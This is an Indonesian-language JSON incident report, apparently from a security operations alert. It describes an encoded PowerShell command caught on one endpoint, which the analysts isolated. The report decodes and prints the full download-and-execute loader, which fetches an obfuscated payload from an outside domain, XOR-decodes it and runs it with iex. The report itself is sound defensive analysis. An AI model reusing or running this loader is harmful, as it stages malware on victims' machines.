{"title":"Malicious File Download Via Powershell - desktop-cgvp5g4 (10.90.146.198)","attack_type":"Malware, RCE","tags":"Malware, RCE,Persistent Threat,Tunnel/Backdoor","severity":"Critical","description":"Kami menemukan adanya aktifitas yang mencurigakan berasal dari endpoint desktop-cgvp5g4 (10.90.146.198) dengan user \"Enigma\" dan terdapat pada group \"Workgroup\"  Aktifitas tersebut menunjukan eksekusi terhadap powershell dengan perintah (processCmd) berikut \"powershell -windowstyle hidden -e JAB3AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAA7ACQAYgBzAD0AJAB3AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AbwBwAGUAbgBzAHUAbgAuAG0AbwBuAHMAdABlAHIALwAyADcAMAA0AGUALgBiAHMANgA0ACIAKQA7AFsAQgB5AHQAZQBbAF0AXQAgACQAeAA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAHMALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAiAGIAIgApAC4AUgBlAHAAbABhAGMAZQAoACIAQAAiACwAIgBoACIAKQAuAFIAZQBwAGwAYQBjAGUAKAAiACQAIgAsACIAbQAiACkALgBSAGUAcABsAGEAYwBlACgAIgAlACIALAAiAHAAIgApAC4AUgBlAHAAbABhAGMAZQAoACIAXgAiACwAIgB2ACIAKQApADsAZgBvAHIAKAAkAGkAPQAwADsAJABpACAALQBsAHQAIAAkAHgALgBDAG8AdQBuAHQAOwAkAGkAKwArACkAewAkAHgAWwAkAGkAXQA9ACAAKAAkAHgAWwAkAGkAXQAgAC0AYgB4AG8AcgAgADEANgA3ACkAIAAtAGIAeABvAHIAIAAxADgAfQA7AGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJAB4ACkAKQA= \" dengan parameter \"-e\" yang digunakan untuk mengeksekusi encoded command .Ditemukan character \"=\" pada akhir payload yang memungkinkan bahwa perintah yang di encode tersebut menggunakan Base64 encoode.  Setelah Kami lakukan decode didapatkan hasil sebagai berikut:   $�w�=�n�e�w�-�o�b�j�e�c�t� �S�y�s�t�e�m�.�N�e�t�.�W�e�b�c�l�i�e�n�t�;�$�b�s�=�$�w�.�D�o�w�n�l�o�a�d�S�t�r�i�n�g�(�\"�h�t�t�p�s�:�/�/�o�p�e�n�s�u�n�.�m�o�n�s�t�e�r�/�2�7�0�4�e�.�b�s�6�4�\"�)�;�[�B�y�t�e�[�]�]� �$�x�=�[�C�o�n�v�e�r�t�]�:�:�F�r�o�m�B�a�s�e�6�4�S�t�r�i�n�g�(�$�b�s�.�R�e�p�l�a�c�e�(�\"�!�\"�,�\"�b�\"�)�.�R�e�p�l�a�c�e�(�\"�@�\"�,�\"�h�\"�)�.�R�e�p�l�a�c�e�(�\"�$�\"�,�\"�m�\"�)�.�R�e�p�l�a�c�e�(�\"�%�\"�,�\"�p�\"�)�.�R�e�p�l�a�c�e�(�\"�^�\"�,�\"�v�\"�)�)�;�f�o�r�(�$�i�=�0�;�$�i� �-�l�t� �$�x�.�C�o�u�n�t�;�$�i�+�+�)�{�$�x�[�$�i�]�=� �(�$�x�[�$�i�]� �-�b�x�o�r� �1�6�7�)� �-�b�x�o�r� �1�8�}�;�i�e�x�(�[�S�y�s�t�e�m�.�T�e�x�t�.�E�n�c�o�d�i�n�g�]�:�:�U�T�F�8�.�G�e�t�S�t�r�i�n�g�(�$�x�)�)�  kemungkinan karakter \"�\" merupakan karakter yang tidak dapat dibaca oleh system yang dapat digunakan untuk melakukan \"defense evasion\" atau melakukan bypass terhadap antivirus.Dari payload tersebut kami menemukan perintah powershell sebenarnya yang sebelumnya di eksekusi yakni:  $w=new-object System.Net.Webclient;$bs=$w.DownloadString(\"https://opensun.monster/2704e.bs64\");[Byte[]] $x=[Convert]::FromBase64String($bs.Replace(\"!\",\"b\").Replace(\"@\",\"h\").Replace(\"$\",\"m\").Replace(\"%\",\"p\").Replace(\"^\",\"v\"));for($i=0;$i -lt $x.Count;$i++){$x[$i]= ($x[$i] -bxor 167) -bxor 18};iex([System.Text.Encoding]::UTF8.GetString($x))  payload tersebut kemungkinan bertujuan untuk melakukan file downloads melalui payload yang disediakan dalam domain opensum.monster","action":"Dilakukan Isolate/Containment terhadap desktop-cgvp5g4 (10.90.146.198) untuk meminimalisir dampak","recommendations":"Melakukan Investigasi Lebih lanjut serta full scanning terhadap compromised endpoint","details":"Detection Name: File Download via PowerShell Encoded Command\r\nTechnique: T1105 - Ingress Tool Transfer\r\nData source / processor: Endpoint Sensor\r\nTime: 2024-04-30 14:07:26\r\n\r\nEndpoint: desktop-cgvp5g4\r\n(processCmd) powershell -windowstyle hidden -e JAB3AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAA7ACQAYgBzAD0AJAB3AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AbwBwAGUAbgBzAHUAbgAuAG0AbwBuAHMAdABlAHIALwAyADcAMAA0AGUALgBiAHMANgA0ACIAKQA7AFsAQgB5AHQAZQBbAF0AXQAgACQAeAA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAHMALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAiAGIAIgApAC4AUgBlAHAAbABhAGMAZQAoACIAQAAiACwAIgBoACIAKQAuAFIAZQBwAGwAYQBjAGUAKAAiACQAIgAsACIAbQAiACkALgBSAGUAcABsAGEAYwBlACgAIgAlACIALAAiAHAAIgApAC4AUgBlAHAAbABhAGMAZQAoACIAXgAiACwAIgB2ACIAKQApADsAZgBvAHIAKAAkAGkAPQAwADsAJABpACAALQBsAHQAIAAkAHgALgBDAG8AdQBuAHQAOwAkAGkAKwArACkAewAkAHgAWwAkAGkAXQA9ACAAKAAkAHgAWwAkAGkAXQAgAC0AYgB4AG8AcgAgADEANgA3ACkAIAAtAGIAeABvAHIAIAAxADgAfQA7AGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJAB4ACkAKQA=\r\n(parentCmd) explorer.exe\r\n(objectRawDataStr) $w=new-object System.Net.Webclient;$bs=$w.DownloadString(\"https://opensun.monster/2704e.bs64\");[Byte[]] $x=[Convert]::FromBase64String($bs.Replace(\"!\",\"b\").Replace(\"@\",\"h\").Replace(\"$\",\"m\").Replace(\"%\",\"p\").Replace(\"^\",\"v\"));for($i=0;$i -lt $x.Count;$i++){$x[$i]= ($x[$i] -bxor 167) -bxor 18};iex([System.Text.Encoding]::UTF8.GetString($x))"}